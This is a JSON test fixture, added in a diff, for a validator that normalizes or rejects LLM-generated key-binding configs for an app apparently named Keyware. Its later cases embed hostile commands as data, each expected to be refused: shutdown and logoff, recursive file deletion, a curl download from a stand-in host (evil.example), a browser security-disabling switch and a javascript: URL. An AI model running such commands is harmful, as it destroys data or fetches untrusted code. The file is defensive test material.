@@ -1,0 +1,352 @@
+[
+ {
+  "model": "gemini",
+  "name": "clean",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_url\",\"url\":\"https://www.youtube.com\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_url\",\"url\":\"https://www.youtube.com\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "fenced json",
+  "raw": "```json\n{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_url\",\"url\":\"https://www.youtube.com\"},\"notes\":\"\"}\n```",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_url\",\"url\":\"https://www.youtube.com\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "uppercase and alias key names",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"chord\",\"keys\":[\"Control\",\"Shift\",\"T\"]},\"action\":{\"type\":\"key_combo\",\"keys\":[\"CTRL\",\"Escape\"]},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"chord\",\"keys\":[\"ctrl\",\"shift\",\"t\"]},\"action\":{\"type\":\"key_combo\",\"keys\":[\"ctrl\",\"esc\"]},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "double-tap spelled with a dash",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"double-tap\",\"keys\":[\"F8\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"double_tap\",\"keys\":[\"f8\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "url without scheme",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f2\"]},\"action\":{\"type\":\"open_url\",\"url\":\"youtube.com\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f2\"]},\"action\":{\"type\":\"open_url\",\"url\":\"https://youtube.com\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "hold_ms out of range",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"hold\",\"keys\":[\"p\"],\"hold_ms\":99999},\"action\":{\"type\":\"screenshot\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"hold\",\"keys\":[\"p\"],\"hold_ms\":5000},\"action\":{\"type\":\"screenshot\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "missing profile",
+  "raw": "{\"ok\":true,\"label\":\"x\",\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f7\"]},\"action\":{\"type\":\"lock_screen\"}}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"x\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f7\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "groq-gpt-oss-120b",
+  "name": "Gaming profile with no process names gets the Gaming processes",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"app\",\"name\":\"Gaming\"},\"trigger\":{\"mode\":\"hold\",\"keys\":[\"q\"],\"hold_ms\":2000},\"action\":{\"type\":\"type_text\",\"text\":\"gg\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"app\",\"name\":\"Gaming\",\"process_names\":[\"javaw.exe\",\"minecraft.exe\"]},\"trigger\":{\"mode\":\"hold\",\"keys\":[\"q\"],\"hold_ms\":2000},\"action\":{\"type\":\"type_text\",\"text\":\"gg\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "app profile with only a process gets a name",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"app\",\"process_names\":[\"chrome.exe\"]},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f8\"]},\"action\":{\"type\":\"key_combo\",\"keys\":[\"ctrl\",\"shift\",\"t\"]},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"app\",\"name\":\"Chrome\",\"process_names\":[\"chrome.exe\"]},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f8\"]},\"action\":{\"type\":\"key_combo\",\"keys\":[\"ctrl\",\"shift\",\"t\"]},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "unknown app profile name alone is kept for the app to match",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"app\",\"name\":\"Photoshop\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f8\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"app\",\"name\":\"Photoshop\",\"process_names\":[]},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f8\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "app profile with neither name nor process is invalid",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"app\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f8\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "gemini",
+  "name": "Minecraft profile renamed to Gaming",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"app\",\"name\":\"Minecraft\",\"process_names\":[\"javaw.exe\"]},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"r\"]},\"action\":{\"type\":\"auto_click\",\"button\":\"left\",\"cps\":15,\"click_mode\":\"hold\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"app\",\"name\":\"Gaming\",\"process_names\":[\"javaw.exe\"]},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"r\"]},\"action\":{\"type\":\"auto_click\",\"button\":\"left\",\"cps\":15,\"click_mode\":\"hold\",\"max_seconds\":0},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "modifier+key sent as tap",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"ctrl\",\"q\"]},\"action\":{\"type\":\"type_text\",\"text\":\"hi\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"chord\",\"keys\":[\"ctrl\",\"q\"]},\"action\":{\"type\":\"type_text\",\"text\":\"hi\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemini",
+  "name": "off-topic",
+  "raw": "{\"ok\":false,\"not_binding\":true,\"error\":\"Not a key binding.\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Not a key binding.\",\"not_binding\":true}"
+ },
+ {
+  "model": "gemini",
+  "name": "invented key name",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"mouse4\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "gemini",
+  "name": "truncated by max_tokens",
+  "raw": "{\"ok\":true,\"label\":\"Work mode\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f6\"]},\"action\":{\"type\":\"macro\",\"steps\":[{\"op\":\"app\"",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "groq-gpt-oss",
+  "name": "unknown action type",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_website\",\"url\":\"https://x.com\"},\"notes\":\"\"}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "groq-gpt-oss",
+  "name": "prose only",
+  "raw": "I can help you with that! Press F9 to open YouTube.",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "groq-gpt-oss",
+  "name": "chord without modifier",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"chord\",\"keys\":[\"a\",\"b\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "groq-gpt-oss",
+  "name": "tap with two keys",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f1\",\"f2\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "groq-gpt-oss",
+  "name": "macro with unknown op",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f6\"]},\"action\":{\"type\":\"macro\",\"steps\":[{\"op\":\"run\",\"target\":\"x\"}]},\"notes\":\"\"}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "groq-gpt-oss",
+  "name": "refusal without a reason",
+  "raw": "{\"ok\":false}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "groq-gpt-oss",
+  "name": "cps too high",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f6\"]},\"action\":{\"type\":\"auto_click\",\"button\":\"right\",\"cps\":500,\"click_mode\":\"toggle\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f6\"]},\"action\":{\"type\":\"auto_click\",\"button\":\"right\",\"cps\":50,\"click_mode\":\"toggle\",\"max_seconds\":0},\"notes\":\"\"}"
+ },
+ {
+  "model": "groq-gpt-oss",
+  "name": "autoclick on a hold trigger",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"hold\",\"keys\":[\"r\"],\"hold_ms\":800},\"action\":{\"type\":\"auto_click\",\"button\":\"left\",\"cps\":10,\"click_mode\":\"hold\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"r\"]},\"action\":{\"type\":\"auto_click\",\"button\":\"left\",\"cps\":10,\"click_mode\":\"hold\",\"max_seconds\":0},\"notes\":\"\"}"
+ },
+ {
+  "model": "groq-gpt-oss",
+  "name": "nine bindings",
+  "raw": "{\"ok\":true,\"bindings\":[{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f1\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"},{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f2\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"},{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f3\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"},{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f4\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"},{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f5\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"},{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f6\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"},{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f7\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"},{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f8\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"},{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}]}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "groq-qwen",
+  "name": "think block then JSON",
+  "raw": "<think>The user wants F9.</think>\n{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_app\",\"app\":\"notepad.exe\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_app\",\"app\":\"notepad.exe\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "groq-qwen",
+  "name": "single quotes (not JSON)",
+  "raw": "{'ok': True, 'label': 'x'}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "gemma",
+  "name": "preamble and fence",
+  "raw": "Here is the binding:\n```json\n{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"leader\",\"keys\":[\"g\"]},\"action\":{\"type\":\"open_url\",\"url\":\"https://www.google.com/search?q=weather\"},\"notes\":\"\"}\n```\nLet me know!",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"leader\",\"keys\":[\"g\"]},\"action\":{\"type\":\"open_url\",\"url\":\"https://www.google.com/search?q=weather\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "gemma",
+  "name": "leader key put in keys",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"leader\",\"keys\":[\"f13\",\"y\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "invalid",
+  "reply": null
+ },
+ {
+  "model": "gemma",
+  "name": "ok as a string",
+  "raw": "{\"ok\":\"true\",\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f7\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f7\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "any",
+  "name": "panic chord as trigger",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"chord\",\"keys\":[\"ctrl\",\"alt\",\"shift\",\"esc\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't use the panic shortcut as a trigger.\"}"
+ },
+ {
+  "model": "any",
+  "name": "ctrl+alt+delete as trigger",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"chord\",\"keys\":[\"ctrl\",\"alt\",\"del\"]},\"action\":{\"type\":\"lock_screen\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't use the panic shortcut as a trigger.\"}"
+ },
+ {
+  "model": "any",
+  "name": "panic chord as action is fine? no: never press it",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f1\"]},\"action\":{\"type\":\"key_combo\",\"keys\":[\"ctrl\",\"alt\",\"shift\",\"esc\"]},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't press the panic shortcut.\"}"
+ },
+ {
+  "model": "any",
+  "name": "task manager shortcut as action is fine",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"chord\",\"keys\":[\"ctrl\",\"alt\",\"m\"]},\"action\":{\"type\":\"key_combo\",\"keys\":[\"ctrl\",\"shift\",\"esc\"]},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"chord\",\"keys\":[\"ctrl\",\"alt\",\"m\"]},\"action\":{\"type\":\"key_combo\",\"keys\":[\"ctrl\",\"shift\",\"esc\"]},\"notes\":\"\"}"
+ },
+ {
+  "model": "any",
+  "name": "shutdown command",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f12\"]},\"action\":{\"type\":\"run_command\",\"command\":\"shutdown /s /t 0\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't shut down, restart or sign out.\"}"
+ },
+ {
+  "model": "any",
+  "name": "restart via powershell",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f12\"]},\"action\":{\"type\":\"run_command\",\"command\":\"powershell Restart-Computer\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't shut down, restart or sign out.\"}"
+ },
+ {
+  "model": "any",
+  "name": "sign out",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f12\"]},\"action\":{\"type\":\"run_command\",\"command\":\"logoff\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't shut down, restart or sign out.\"}"
+ },
+ {
+  "model": "any",
+  "name": "delete files",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"run_command\",\"command\":\"del /q %TEMP%\\\\*\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't delete files or format drives.\"}"
+ },
+ {
+  "model": "any",
+  "name": "remove-item",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"run_command\",\"command\":\"Remove-Item -Recurse C:\\\\Users\\\\me\\\\Downloads\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't delete files or format drives.\"}"
+ },
+ {
+  "model": "any",
+  "name": "change default audio device",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f10\"]},\"action\":{\"type\":\"run_command\",\"command\":\"nircmd setdefaultsounddevice \\\"Headphones\\\"\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't change the default audio device.\"}"
+ },
+ {
+  "model": "any",
+  "name": "audio settings via app",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f10\"]},\"action\":{\"type\":\"open_app\",\"app\":\"mmsys.cpl\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't open mmsys.cpl.\"}"
+ },
+ {
+  "model": "any",
+  "name": "download code",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f10\"]},\"action\":{\"type\":\"run_command\",\"command\":\"curl https://evil.example/x.ps1 -o x.ps1\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't download code.\"}"
+ },
+ {
+  "model": "any",
+  "name": "open cmd",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_app\",\"app\":\"cmd.exe\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't open cmd.exe.\"}"
+ },
+ {
+  "model": "any",
+  "name": "open a script file",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_path\",\"path\":\"C:\\\\tools\\\\wipe.bat\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't open programs or scripts as files.\"}"
+ },
+ {
+  "model": "any",
+  "name": "app with switches in a macro",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"macro\",\"steps\":[{\"op\":\"app\",\"target\":\"chrome.exe\",\"args\":[\"--disable-web-security\"]}]},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't run apps with switches.\"}"
+ },
+ {
+  "model": "any",
+  "name": "javascript url",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_url\",\"url\":\"javascript:alert(1)\"},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't open script links.\"}"
+ },
+ {
+  "model": "any",
+  "name": "harmless run_command passes (app asks to confirm)",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"run_command\",\"command\":\"code C:\\\\projects\\\\site\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"run_command\",\"command\":\"code C:\\\\projects\\\\site\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "any",
+  "name": "typing the word shutdown is fine",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"type_text\",\"text\":\"brb, the server shutdown is at 5\"},\"notes\":\"\"}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"type_text\",\"text\":\"brb, the server shutdown is at 5\"},\"notes\":\"\"}"
+ },
+ {
+  "model": "any",
+  "name": "typing a destructive command line",
+  "raw": "{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"macro\",\"steps\":[{\"op\":\"text\",\"text\":\"shutdown /s /t 0\"},{\"op\":\"key\",\"key\":\"enter\"}]},\"notes\":\"\"}",
+  "status": "refusal",
+  "reply": "{\"ok\":false,\"error\":\"Keyware won't type destructive commands.\"}"
+ },
+ {
+  "model": "any",
+  "name": "batch keeps the safe ones and notes the rest",
+  "raw": "{\"ok\":true,\"bindings\":[{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_url\",\"url\":\"https://www.youtube.com\"},\"notes\":\"\"},{\"ok\":true,\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f12\"]},\"action\":{\"type\":\"run_command\",\"command\":\"shutdown -r\"},\"notes\":\"\"}]}",
+  "status": "ok",
+  "reply": "{\"ok\":true,\"bindings\":[{\"label\":\"Test\",\"profile\":{\"scope\":\"global\"},\"trigger\":{\"mode\":\"tap\",\"keys\":[\"f9\"]},\"action\":{\"type\":\"open_url\",\"url\":\"https://www.youtube.com\"},\"notes\":\"Left out one binding: Keyware won't shut down, restart or sign out.\"}]}"
+ }
+]
